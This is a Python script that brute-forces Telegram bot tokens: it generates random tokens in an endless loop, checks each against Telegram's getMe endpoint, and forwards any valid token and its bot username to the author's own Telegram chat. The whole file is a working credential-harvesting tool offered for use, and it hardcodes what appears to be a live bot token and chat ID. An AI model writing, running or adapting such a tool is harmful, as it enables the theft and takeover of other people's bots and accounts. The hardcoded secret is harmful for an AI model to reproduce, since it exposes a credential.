import requests
import random
import string
import logging
import time
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Your bot's token where you want to send the found tokens
YOUR_BOT_TOKEN = '5583773090:AAF-fazf-qderti_gq1yPf2Avk1Z3Gq7cKI'
CHAT_ID = '5079629749'

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

attempts = []

def generate_random_token():
    part1 = ''.join(random.choices(string.digits, k=9))
    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase + '-_', k=35))
    return f"{part1}:{part2}"

def check_token(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url)
    attempts.append(f"Attempted token: {token} - Status Code: {response.status_code}")
    if response.status_code == 200:
        return response.json()['result']
    return None

def send_message_to_admin(message):
    bot = Bot(token=YOUR_BOT_TOKEN)
    bot.send_message(chat_id=CHAT_ID, text=message)

def start(update: Update, context: CallbackContext) -> None:
    message = "Bot is UP\nUse /status to check all attempts."
    update.message.reply_text(message)

def status(update: Update, context: CallbackContext) -> None:
    message = "Attempts:\n" + "\n".join(attempts)
    update.message.reply_text(message)

def main():
    # Notify admin that the bot has started
    send_message_to_admin("Bot started and checking for valid tokens...")

    # Set up the updater and dispatcher
    updater = Updater(YOUR_BOT_TOKEN)
    dispatcher = updater.dispatcher

    # Add command handlers to dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("status", status))

    # Start the bot
    updater.start_polling()
    logger.info("Bot started")

    while True:
        try:
            random_token = generate_random_token()
            result = check_token(random_token)
            if result:
                username = result['username']
                message = f"Valid token found: {random_token}\nUsername: {username}"
                send_message_to_admin(message)
            # Add a delay to avoid flood limits
            time.sleep(2)  # Adjust the delay as needed to avoid rate limits
        except Exception as e:
            logger.error(f"Error occurred: {e}")
            time.sleep(5)  # Delay to prevent continuous error logging

if __name__ == "__main__":
    main()
